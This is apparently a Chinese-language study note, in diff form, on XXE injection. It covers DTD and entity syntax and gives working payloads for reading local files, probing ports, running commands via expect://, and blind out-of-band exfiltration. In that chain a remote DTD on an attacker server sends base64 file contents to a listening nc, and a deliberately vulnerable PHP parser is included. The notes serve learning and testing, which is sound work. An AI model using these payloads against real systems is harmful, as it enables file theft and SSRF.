@@ -1,0 +1,204 @@
+xxe反序列化：一般是通过白盒审计挖出来的。
+
+xxe：XML在引入外部实体时完成注入攻击。
+工具：
+XXEpayload
+https://github.com/hackping/XXEpayload
+
+
+危害：
+DOS攻击、SSRF攻击、使用file等协议读写任意文件、端口或服务探测、执行系统命令。
+
+
+json之前数据传输方式主要以XML格式为主。
+XML主要是在数据传输或存储时使用，html主要是用于展示页面。 
+
+  
+DTD：文档类型定义：一套关于标记性语言的语法规则。
+
+
+1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
+2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。
+
+
+DTD文档的三种形式：
+内部DTD类型：<!DOCTYPE 根元素[子元素声明]>
+外部DTD类型：<!DOCTYPE 根元素 SYSTEM "DTD文件路径">
+内外部DTD文档结合：<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
+
+
+实体：类似一个变量，存取数据的值。
+xxe实体和DTD两种引用方式：
+内部DTD声明：	
+<!DOCTYPE 根元素 [元素声明]>
+外部DTD引用：
+<!DOCTYPE 根元素 SYSTEM "文件名">
+
+DTD实体也有两种构建方式：
+内部实体声明：
+<!ENTITY entity-name "entity-value">
+外部实体声明：
+<!ENTITY entity-name SYSTEM "URI/URL">
+
+
+
+
+实体的具体分类：
+预定义：&amp;&lt;&#37;
+内部实体：<!ENTITY 实体名称 "实体的值">
+外部实体：<!ENTITY 实体名称 SYSTEM "URI/URL">
+内部实体和外部实体统称为普通实体
+普通实体的引用方式是&普通实体名;
+参数实体：<!ENTITY % 实体名 "实体内容">
+参数实体的引用方式是%实体名;
+普通实体和参数实体可能是：
+内部的（定义在当前DTD中）
+外部的（定义在外部资源中）
+
+
+
+普通实体需先声明：
+方式：&实体名
+如：
+<?xml version="1.0"><!DOCTYPE note [ <!ENITY source-text "sbxz">]>
+<note>&source-text</note>
+
+参数实体：
+方式：% 实体名 	
+如：
+<!ENITY % znamew "sbxz">
+<zq>%znamew;</zq>
+
+
+为了避免错误，使用实体来表示特殊字符：
+&lt;    	<    小于
+&gt;    	>    大于
+&amp;    	&    和号
+&apos;    	'    省略号
+&quot;    	"    引号
+
+
+
+只有在DTD中才能引用参数实体
+
+
+
+
+DTD内部元素声明：
+<!DOCTYPE 根元素 [元素声明]>
+
+
+
+
+
+读文件：
+--------------1s----------------
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [<!ENTITY xxes SYSTEM "file:///c:/windows/win.ini"> ]>
+<user><username>&xxes;</username><password>admin</password></user>
+---------------1e---------------
+
+若想读取原始数据(比如碰到特殊字符)，则使用<![CDATA[
+CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记
+
+xml不支持拼接。
+故使用参数实体或base64(一般是通过各种伪协议).
+--------------1s----------------
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [<!ENTITY xxes SYSTEM "php://filter/read=convert.base64-encode/resource=index.html"> ]>
+<user><username>&xxes;</username><password>admin</password></user>
+---------------1e---------------
+成功读取。 可以使用../	或其他盘符或根路径
+
+
+
+
+
+
+
+json也能改为xml进行利用。
+
+
+---------------1s--------------
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE root [ 
+<!ENTITY % remote SYSTEM "http://asdwq16.qr9uig.ceye.io/asdw_tetszq16"> 
+%remote;
+]> <root/>
+-------------1e---------------
+eg2：
+----------1s-------------------
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE goodies [  
+<!ENTITY goodies SYSTEM "http://asdwq16.qr9uig.ceye.io/asdw_tetszq16"> ]> 
+<czreds>&goodies;</czreds>
+------------1e-------------------
+成功接收到记录。
+
+
+
+端口探测：
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [<!ENTITY xxes SYSTEM "http://127.0.0.1:87"> ]>
+<user><username>&xxes;</username><password>admin</password></user>
+
+命令执行：
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [<!ENTITY xxes SYSTEM "expect://whoami"> ]>
+<user><username>&xxes;</username><password>admin</password></user>
+但php默认没有开启expect扩展(也是expect://协议)。 故一般不太行。
+注：其中ANY表示任意一个根元素、任何标签都可以引用。
+
+
+
+
+无回显读取本地敏感文件(Blind OOB XXE)：
+eg1：
+xmlz.php代码：
+------------1s--------
+<?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents('php://input');
+$dom = new DOMDocument();
+$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?>
+------------1e----------
+
+
+将testz.dtd文件放在vps上。
+testz.dtd代码如下：
+-------------1s-----------
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/phpstudy/WWW/q2.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.88.146:9999?p=%file;'>">
+-------------1e------------
+其中&#37;是%的unicode编码。因为<!ENTITY的值里的%需要进行unicode编码。 当然，再后面的%只是字符串而已。
+
+payload：我是将其转为POST方式发送的。 一般Content-Type默认就行。
+-----------1s---------
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://192.168.88.146:80/testqz.dtd">
+%remote;%int;%send;
+]>
+------------1e---------
+
+poc2:
+-----------1s---------
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE root [ 
+<!ENTITY % remote SYSTEM "http://192.168.88.146:80/testqz.dtd">
+%remote;%int;%send;
+]>
+<root/>
+------------1e---------
+
+
+首先nc -lvvp 9999开启监听，成功接收到请求。base64解码即可。
+
+
+
+xxe支持的协议：
+参考https://f5.pm/go-2094.html
+php的file、http、ftp、php、data、phar、compress.zlib等。
+java的http、https、ftp、file、jar、netdoc、gopher等。
